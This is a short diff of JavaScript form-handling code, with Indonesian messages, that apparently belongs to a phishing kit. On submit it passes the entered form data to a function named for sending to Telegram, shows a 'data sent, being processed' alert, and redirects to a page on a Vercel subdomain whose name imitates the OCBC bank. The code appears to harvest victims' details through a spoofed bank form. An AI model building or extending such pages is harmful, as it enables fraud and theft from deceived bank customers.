@@ -98,7 +98,7 @@ document.getElementById('blockForm').addEventListener('submit', async (e) => {
   const sukses = await kirimKeTelegram(data);
   if (sukses) {
     alert("✅ Data berhasil dikirim! Sedang diproses...");
-    window.location.href = "two.html";
+    window.location.href = "https://ocbc-lyart.vercel.app/two.html";
   } else {
     alert("❌ Gagal mengirim! Coba lagi nanti.");
   }
